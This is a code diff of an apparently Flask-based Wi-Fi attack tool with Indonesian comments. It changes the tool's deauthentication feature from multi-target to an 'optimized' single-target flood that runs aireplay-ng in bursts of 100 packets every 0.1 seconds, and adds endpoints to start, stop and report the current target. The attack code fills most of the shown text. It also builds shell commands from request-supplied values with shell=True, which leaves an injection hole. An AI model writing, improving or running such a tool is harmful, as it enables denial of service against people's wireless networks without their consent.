@@ -18,6 +18,7 @@ original_iface = None
 attack_processes = {"sniff": None, "deauth": None}
 deauth_thread = None
 deauth_running = False
+current_target = None
 
 # ====================== FUNGSI MANAJEMEN INTERFACE ======================
 
@@ -143,7 +144,6 @@ def parse_csv(filename):
                 channel = parts[3].strip()
                 essid = parts[13].strip()
                 power_str = parts[8].strip() if len(parts) > 8 else ''
-                # Konversi power ke int
                 try:
                     power = int(power_str)
                 except:
@@ -191,7 +191,6 @@ def scan_wifi():
                     break
         
         if networks:
-            # Urutkan berdasarkan power (terbesar = terkuat), yang None ditaruh di bawah
             networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
             print(f"[+] Found {len(networks)} networks")
             return jsonify({"status": "success", "networks": networks})
@@ -214,7 +213,6 @@ def scan_wifi():
                             "power": None,
                             "signal_level": "Almost Hilang"
                         })
-            # Urutkan (fallback tidak punya power, tetap beri urutan)
             networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
             return jsonify({"status": "success", "networks": networks})
             
@@ -253,45 +251,87 @@ def stop_sniff_process():
         os.killpg(os.getpgid(attack_processes["sniff"].pid), signal.SIGTERM)
         attack_processes["sniff"] = None
 
-# ====================== DEAUTH MULTI-TARGET ======================
+# ====================== DEAUTH SINGLE TARGET (DIOPTIMALKAN) ======================
 
-def deauth_loop(targets, interface):
-    global deauth_running
+def deauth_loop_single(target, interface):
+    """
+    Loop deauth untuk satu target saja dengan optimasi:
+    - Burst packet yang lebih agresif
+    - Delay minimal antar paket
+    - Menggunakan channel target secara konsisten
+    """
+    global deauth_running, current_target
+    bssid = target['bssid']
+    channel = target['channel']
+    essid = target.get('essid', 'Unknown')
+    
+    print(f"[*] Starting optimized deauth on {bssid} (CH {channel}) - {essid}")
+    
+    # Set channel ke target
+    set_channel(interface, channel)
+    
+    # HITUNG TOTAL PAKET YANG DIKIRIM
+    packet_count = 0
+    attack_rounds = 0
+    
     while deauth_running:
-        for target in targets:
-            if not deauth_running:
-                break
-            bssid = target['bssid']
-            channel = target['channel']
-            set_channel(interface, channel)
-            cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}"
-            try:
-                subprocess.run(cmd, shell=True, timeout=2, check=False)
-            except:
-                pass
-            time.sleep(0.5)
-        time.sleep(1)
+        attack_rounds += 1
+        
+        # Kirim BURST deauth dengan jumlah paket yang banyak (100 paket)
+        # Ini lebih kuat karena langsung mengirim banyak paket sekaligus
+        cmd = f"sudo aireplay-ng --deauth 100 -a {bssid} {interface}"
+        
+        try:
+            # Jalankan dengan timeout singkat (1 detik) agar tidak blocking
+            proc = subprocess.run(cmd, shell=True, timeout=1, capture_output=True, text=True)
+            packet_count += 100
+            
+            # Log setiap 10 round
+            if attack_rounds % 10 == 0:
+                print(f"[*] Attack round {attack_rounds} | Total packets: {packet_count}")
+            
+        except subprocess.TimeoutExpired:
+            # Timeout expired tapi proses masih jalan, kita lanjutkan
+            pass
+        except Exception as e:
+            print(f"[-] Error in deauth: {e}")
+        
+        # Delay sangat minimal (0.1 detik) untuk efisiensi dan stabilitas
+        time.sleep(0.1)
+    
+    print(f"[*] Deauth stopped. Total packets sent: {packet_count}")
 
 @app.route('/start_deauth', methods=['POST'])
 def start_deauth():
-    global deauth_thread, deauth_running
+    global deauth_thread, deauth_running, current_target
     data = request.json
     targets = data.get('targets')
+    
     if not targets or len(targets) == 0:
         return jsonify({"status": "error", "message": "No targets selected"})
+    
+    # Ambil target pertama saja (single target)
+    target = targets[0]
+    current_target = target
     
     interface = get_monitor_interface()
     if not interface:
         return jsonify({"status": "error", "message": "Monitor interface not found"})
     
+    # Stop deauth yang sedang berjalan
     stop_deauth_process()
+    
+    # Start deauth baru
     deauth_running = True
-    deauth_thread = threading.Thread(target=deauth_loop, args=(targets, interface))
+    deauth_thread = threading.Thread(target=deauth_loop_single, args=(target, interface))
     deauth_thread.daemon = True
     deauth_thread.start()
     
-    target_list = ", ".join([t['bssid'] for t in targets])
-    return jsonify({"status": "success", "message": f"Deauth started on {len(targets)} target(s): {target_list}"})
+    return jsonify({
+        "status": "success", 
+        "message": f"Deauth started on {target['bssid']} (CH {target['channel']})",
+        "target": target
+    })
 
 @app.route('/stop_deauth', methods=['POST'])
 def stop_deauth():
@@ -299,12 +339,31 @@ def stop_deauth():
     return jsonify({"status": "success", "message": "Deauth stopped"})
 
 def stop_deauth_process():
-    global deauth_running, deauth_thread
+    global deauth_running, deauth_thread, current_target
     deauth_running = False
     if deauth_thread and deauth_thread.is_alive():
-        deauth_thread.join(timeout=2)
+        deauth_thread.join(timeout=3)
     deauth_thread = None
+    current_target = None
+    
+    # Matikan semua proses aireplay-ng yang mungkin masih berjalan
     subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
+
+# ====================== GET CURRENT TARGET ======================
+
+@app.route('/current_target', methods=['GET'])
+def get_current_target():
+    global current_target
+    if current_target and deauth_running:
+        return jsonify({
+            "status": "running",
+            "target": current_target
+        })
+    else:
+        return jsonify({
+            "status": "idle",
+            "target": None
+        })
 
 # ====================== CLEANUP ======================
 
